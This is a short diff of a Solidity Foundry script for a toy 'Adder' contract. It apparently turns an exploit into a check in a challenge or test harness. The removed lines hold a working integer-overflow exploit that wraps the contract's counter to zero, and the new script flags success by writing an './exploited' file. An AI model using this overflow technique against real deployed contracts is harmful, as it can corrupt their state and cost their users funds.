@@ -6,18 +6,11 @@ import {DeploymentReaderScript} from "forge-deploy-lib/DeploymentScript.sol";
 
 import {IAdder} from "src/IAdder.sol";
 
-contract ExploitScript is DeploymentReaderScript {
+contract AssertionScript is DeploymentReaderScript {
     function run() external {
         loadDeployment();
         IAdder adder = IAdder(getContract("Adder"));
-        uint256 number = adder.number();
-        uint256 increment;
-        unchecked {
-            increment = type(uint256).max - number + 1;
-        }
-
-        vm.startBroadcast();
-        adder.add(increment);
-        vm.stopBroadcast();
+        if (adder.number() >= 1) return;
+        vm.writeFile("./exploited", "");
     }
 }
